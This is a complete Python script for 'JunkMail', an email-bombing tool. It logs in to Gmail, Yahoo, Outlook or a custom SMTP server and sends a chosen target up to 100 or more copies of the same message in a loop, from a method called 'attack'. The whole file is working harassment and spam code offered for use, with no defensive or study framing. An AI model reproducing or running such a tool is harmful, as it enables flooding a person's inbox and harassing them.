# Imports necessary libraries
import smtplib
import sys
from smtplib import SMTP
import time

# Makes fancy colors
class bcolors:
  GREEN = '\033[92m'
  YELLOW = '\033[93m'
  RED = '\033[91m'

# Makes the banner
def banner():
  print("""
  Name            : JunkMail
  Documentation   : https://replit.com/@myxanax/JunkMail-v10
  License         : Completely Free
  Version         : 2.3.0
  Thanks to       : Dylan Sola (Dylan Sola)
  """)

# Code
class JunkMail:
  count = 0
  def __init__(self):
    try:
      print(bcolors.RED + "Initializing")
      self.target = str(input(bcolors.RED + "Email to send: "))
      self.mode = int(input(bcolors.RED + "Enter amount of emails to send (1, 2, 3, 4) || 1:(100) 2:(50) 3:(25) 4:(custom) <: "))
      if int(self.mode) > int(4) or int(self.mode) < int(1):
        print("ERROR: Invalid option. Goodbye. ")
        sys.exit(1)
    except Exception as e:
      print(f"ERROR: {e}")
  def bomb(self):
    try:
      print(bcolors.RED + "\nSetting up")
      self.amount = None
      if self.mode == int(1):
        self.amount = int(100)
      elif self.mode == int(2):
        self.amount = int(50)
      elif self.mode == int(3):
        self.amount = int(25)
      else:
        self.amount = int(input(bcolors.GREEN + "Choose a custom amount <: "))
      print("")
    except Exception as e:
      print(f"ERROR: {e}")
  def email(self):
    try:
      print(bcolors.RED + "\nSetting up email")
      self.server = str(input(bcolors.GREEN + "Enter email server | or select premade options - 1:Gmail 2:Yahoo 3:Outlook <:"))
      premade = ['1', '2', '3']
      default_port = True
      if self.server not in premade:
        default_port = False
        self.port = int(input("Enter port number <: "))
      if default_port == True:
        self.port = int(587)
      if self.server == '1':
        self.server = "smtp.gmail.com"
      elif self.server == '2':
        self.server = "smtp.mail.yahoo.com"
      elif self.server == '3':
        self.server = "smtp-mail.outlook.com"
      self.fromAddr = str(input(bcolors.GREEN + "Enter from address <: "))
      self.fromPwd = str(input(bcolors.GREEN + "Enter from password <: "))
      self.subject = str(input(bcolors.GREEN + "Enter subject <: "))
      self.message = str(input(bcolors.GREEN + "Enter message <: "))
      self.msg = '''From: %s\nTo: %s\nSubject: %s\n%s\n
      ''' % (self.fromAddr, self.target, self.subject, self.message)
      self.s = smtplib.SMTP(self.server, self.port)
      self.s.ehlo()
      self.s.starttls()
      self.s.ehlo()
      self.s.login(self.fromAddr, self.fromPwd)
    except Exception as e:
      print(f"ERROR: {e}")
  def send(self):
    try:
      self.s.sendmail(self.fromAddr, self.target, self.msg)
      self.count +=1
      print(bcolors.YELLOW + f"SENT: {self.count}")
    except Exception as e:
      print(f"ERROR: {e}")
  def attack(self):
    print(bcolors.RED + "\nSending emails...")
    for email in range(self.amount+1):
      self.send()
      time.sleep(2)
    self.s.close()
    print("\nEmails sent! Thank you :)")
    sys.exit(0)

if __name__=="__main__":
  banner()
  bomb = JunkMail()
  bomb.bomb()
  bomb.email()
  bomb.attack()